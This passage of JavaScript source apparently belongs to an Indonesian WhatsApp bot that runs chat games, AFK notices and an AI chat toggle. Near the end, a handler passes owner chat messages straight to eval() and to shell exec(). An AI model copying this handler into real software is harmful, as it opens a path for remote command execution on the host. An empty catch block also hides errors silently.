let room = _family100['family100'+from]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
 let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
 if (room.terjawab[index]) return !0
 room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
conn.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+from]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
 delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
 delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await conn.sendText(room.x, str, m, { mentions: parseMention(str) } )
await conn.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
conn.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
conn.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) conn.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) conn.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) conn.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
conn.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) conn.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) conn.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
conn.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`🚫 *Jangan tag dia!*\n❏ *Dia sedang AFK* ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}\n❏ *Selama* ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
*${pushname}* Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================// 
try {
switch(command) {
        case'autochat': case 'autoai': 
        if (!isPrem) return reply(mess.premium)
let zyautochat = `${m.sender.split("@")[0]}`
if (args.length < 1) return m.reply(`*Contoh ${prefix + command} on/off*`)
                if (q == 'on'){
                if (data_autochat.includes(zyautochat)) return m.reply(`Kamu Masih Di Sesi Room Chat!`);
                    data_autochat.push(zyautochat);
                    saveDataChat();
                    m.reply(`berhasil membuka room chat. Kini orang lain tidak bisa mengganggu percakapanmu dengan A.I. Ketik *.${command} off* untuk menutup sesi room saat ini. *Ingat untuk menutup room sebelum kamu pergi!*`)
} else if (q == 'off'){
if (!data_autochat.includes(zyautochat)) return m.reply(`Kamu Tidak Sedang Berada Di Sesi Room Chat`);
const unp = data_autochat.indexOf(zyautochat);
                    data_autochat.splice(unp, 1);
                   saveDataChat();
                    m.reply(`Berhasil menutup room chat.`)
                }
break
           
//=================================================
default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}

try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply('*khusus Premium*')
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
if (!isCreator) return m.reply('*khusus Premium*')
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.isBaileys) return
if (from.endsWith('broadcast')) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
conn.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (error) {
  // tangani kesalahan untuk semua case di sini
}
} catch (err) {
console.log(util.format(err))}}
//=================================================//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
